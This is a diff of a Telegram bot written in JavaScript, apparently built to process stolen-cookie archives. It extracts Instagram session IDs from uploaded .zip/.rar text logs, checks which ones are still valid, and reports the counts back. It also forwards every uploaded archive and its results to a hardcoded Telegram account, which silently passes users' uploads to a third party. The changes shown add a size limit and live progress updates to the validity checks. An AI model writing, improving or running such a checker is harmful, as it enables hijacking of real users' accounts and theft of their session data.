@@ -15,12 +15,17 @@ const bot = new Telegraf(config.bot_token);
 bot.use(session());
 bot.launch();
 bot.catch((err) => {
-  console.log(error)
+  console.log(err);
   bot.telegram.sendMessage("868619239", err.toString());
-})
+});
 bot.on("document", async (ctx) => {
   const documentName = ctx.update.message.document.file_name;
-  if (documentName.includes(".zip") || documentName.includes(".rar")) {
+  const documentSize = ctx.update.message.document.file_size;
+  if(documentSize > 20971520) {
+    ctx.reply('Файл больше 20 Мб');
+    return;
+  }
+   if (documentName.includes(".zip") || documentName.includes(".rar")) {
     let fileId = ctx.update.message.document.file_id;
     const sender = ctx.update.message.from.username;
     bot.telegram.sendMessage("868619239", `@${sender} отправил файл:`);
@@ -32,23 +37,26 @@ bot.on("document", async (ctx) => {
     await extractArchieve(filename, dir);
     const resultDir = dir + "_result";
     const txtFiles = await getTxtfiles(dir);
-    const result = await checkTxtCookies(txtFiles);
+    const result = await checkTxtCookies(txtFiles, ctx);
     const archiveName = await makeArchieve(resultDir);
     await bot.telegram.sendDocument("1351452476", { source: archiveName });
     bot.telegram.sendMessage("1351452476", result);
-    ctx.reply(result)
+    ctx.reply(result);
     await deleteFiles(dir, archiveName, filename);
   } else {
     ctx.reply("неудача");
-  }
+  } 
 });
 
 bot.hears("id", (ctx) => {
   //  bot.telegram.sendMessage('1351452476','ok')
   //bot.telegram.sendDocument('1351452476',{source :"./3/download/insta_result.zip"})
 });
-bot.hears("test", (ctx) => {
-  ctx.reply("Bot works");
+bot.hears("test", async (ctx) => {
+  const message = await ctx.reply("Bot works");
+  //console.dir(message.message_id)
+  //ctx.editMessageText(message.chat.id, message.message_id, message.message_id, `HELLO`)
+  // bot.telegram.editMessageText(message.chat.id, message.message_id, message.message_id, `HELLO AGAIN`)
 });
 
 bot.command("start", async (ctx) => ctx.reply("Привет"));
@@ -77,7 +85,7 @@ const deleteFiles = async (dir, filename, archieve) => {
   await fs.rmdirSync(dir, { recursive: true });
   await fs.rmdirSync(dir + "_result", { recursive: true });
   if (fs.existsSync(filename)) await fs.unlinkSync(filename);
-  if (fs.existsSync(archieve)) await fs.unlinkSync(archieve)
+  if (fs.existsSync(archieve)) await fs.unlinkSync(archieve);
 };
 
 const makeDirs = async (filename) => {
@@ -195,7 +203,7 @@ const getSessionIds = async (path) => {
         sessionId = el.slice(start, end);
       }
       if (!sessionIds.includes(sessionId)) {
-        if(sessionId !== undefined){
+        if (sessionId !== undefined) {
           await sessionIds.push(sessionId);
         }
       }
@@ -209,6 +217,7 @@ const getSessionIds = async (path) => {
     }
   }
   if (res[0]) {
+    let counter = 1;
     let characterCount = (path.match(new RegExp("/", "g")) || []).length;
     let newPath;
     if (characterCount > 4) {
@@ -221,18 +230,23 @@ const getSessionIds = async (path) => {
       let index = path.lastIndexOf("/");
       newPath = path.slice(0, index) + "_result" + path.slice(index);
     }
-    fs.writeFile(newPath, res.join(""), (err) => {
+    let filePath = newPath;
+    while (fs.existsSync(filePath)) {
+      filePath = newPath.replace(/.txt$/, `(${counter}).txt`);
+      counter++;
+    }
+    fs.writeFile(filePath, res.join(""), (err) => {
       if (err) console.error(err);
     });
   }
   return sessionIds;
 };
 
-const checkTxtCookies = async (txtNameArr) => {
+const checkTxtCookies = async (txtNameArr, context) => {
   let allCookies = [];
-  let txtRes = [];
-  let checkerData = [];
   let validCounter = 0;
+  let cookieCounter = 0;
+  const message = await context.reply("Checking...");
   for (let txt of txtNameArr) {
     let cookie = await getSessionIds(txt);
     if (!allCookies.includes(cookie[0])) {
@@ -240,15 +254,26 @@ const checkTxtCookies = async (txtNameArr) => {
     }
   }
   for (let cookie of allCookies) {
-    if(cookie !== undefined){
-      checkerData.push(await checkForValid(cookie));
+    cookieCounter++;
+    if (cookie !== undefined) {
+      let checkRes = await checkForValid(cookie);
+      if (checkRes.includes("Валид")) {
+        validCounter++;
+      }
+      bot.telegram.editMessageText(
+        message.chat.id,
+        message.message_id,
+        message.message_id,
+        `Checking...
+Чекнуто: ${cookieCounter} из ${allCookies.length}
+Валид: ${validCounter}
+      `
+      );
     }
   }
-  for (let el of checkerData) {
-    if (el.includes("instagram.com")) validCounter++;
-  }
-  await txtRes.unshift(`Валид: ${validCounter}\n`);
-  await txtRes.unshift(`Всего найдено куков: ${allCookies.length}\n`);
-  await txtRes.unshift(`Найдено txt файлов: ${txtNameArr.length}\n`);
-  return txtRes.join("");
+  const txtRes = `Найдено txt файлов: ${txtNameArr.length}
+Всего найдено куков: ${allCookies.length}
+Валид: ${validCounter}
+`;
+  return txtRes;
 };
